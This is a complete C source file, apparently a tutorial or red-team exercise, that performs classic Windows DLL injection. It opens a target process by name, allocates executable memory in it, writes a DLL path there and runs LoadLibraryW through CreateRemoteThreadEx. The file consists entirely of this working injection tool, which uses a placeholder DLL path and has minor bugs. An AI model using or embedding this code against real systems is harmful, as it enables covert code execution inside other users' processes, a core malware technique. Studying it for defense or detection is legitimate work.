//includes
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

//our macros..
#define warn(msg, ...) wprintf(L"[-] " msg L"\n", ##__VA_ARGS__)
#define okey(msg, ...) wprintf(L"[+] " msg L"\n", ##__VA_ARGS__)
#define info(msg, ...) wprintf(L"[i] " msg L"\n", ##__VA_ARGS__)

//we initialize our variables
HANDLE hProcess = NULL;
HANDLE hThread = NULL;
HMODULE hKernel;
LPVOID rBuffer = NULL;
BOOL writeProcess = FALSE;
DWORD TID = NULL;
wchar_t shellDLL[MAX_PATH] = L"C:\\path\\to\\inject.dll"; //Dont forget to use two backslashes
size_t sizeS = sizeof(shellDLL);

//The function we will use to find the process based on the Name we will provide as an argument for this exe
HANDLE findProcess(wchar_t* name) {
    // initializing for the function
    HANDLE hProcessSnap, hProcessS = NULL;
    BOOL ProcessFirst = FALSE;
    PROCESSENTRY32 pe32;

    //getting a handle for the snapshot
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (!hProcessSnap) {
        warn(L"Error with Snapshot");
        return NULL;
    }
    pe32.dwSize = sizeof(PROCESSENTRY32);
    ProcessFirst = Process32First(hProcessSnap, &pe32);
    if (!ProcessFirst) {
        warn(L"Error with ProcessFirst");
        CloseHandle(hProcessSnap);
        return NULL;
    }

    //now we need to go through every process in the snapshot and compare their names with the name we gave as argument to this function
    do {

        if (!wcscmp(pe32.szExeFile, name)) {

            hProcessS = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
            if (hProcessS) {
                CloseHandle(hProcessSnap);
                return hProcessS; //found the process and it returns the handle to it
            }
            else {
                warn(L"Error with hProcess in findProcess");
                CloseHandle(hProcessSnap);
                return NULL;
            }
        }

    } while (Process32Next(hProcessSnap, &pe32));


}

//make sure to set the main for Wide, or you will get errors
int wmain(int argc, wchar_t* argv[]) {

    if (argc < 2) {
        warn(L"Use: %s Process_name", argv[0]);
        return 1;
    }
    info(L"Your argument is %s", argv[1]);
    hProcess = findProcess(argv[1]);

    if (!hProcess) {
        warn(L"Failed to get Process from findProcess. Error: %ld", GetLastError());
        return 1;
    }

    okey(L"The fucnction findProcess returned a process: ");
    info(L"%p", hProcess);

    okey(L"Time to make some virtual space!");

    rBuffer = VirtualAllocEx(hProcess, NULL, sizeS, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (!rBuffer) {
        warn(L"Failed to allocate space. Error: %ld", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    okey(L"We created a buffer! with this size: %ld", sizeS);
    okey(L"Time to write our DLL to it now");

    writeProcess = WriteProcessMemory(hProcess, rBuffer, shellDLL, sizeS, NULL);
    if (!writeProcess) {
        warn(L"Failed to write to the Process. Error: %ld", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    okey(L"We wrote to our process our injection");

    //we need to use GetProcAdress to retrieve LoadLibrary from Kernel32.dll
    hKernel = GetModuleHandleW(L"kernel32");
    if (!hKernel) {
        warn(L"Couldnt get Kernel32.dll Error: %ld", GetLastError());
    }
    info(L"Got Kernel32 module: %p", hKernel);

    LPTHREAD_START_ROUTINE dllBuffer = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel, "LoadLibraryW");

    okey(L"Time to create a Thread");
    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, dllBuffer, rBuffer, 0, 0, &TID);

    if (!hThread) {
        warn(L"Failed to create Thread, Error: %ld", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    info(L"We created a Thread with ID: %ld ", &TID);

    //Dont forget to close up all the handles we created
    if (hThread) {
        info(L"Closing the Thread");
        CloseHandle(hThread);
    }
    if (hProcess) {
        info(L"Closing the Process");
        CloseHandle(hProcess);
    }
    
    okey(L"We are Done!");
    return 0;
}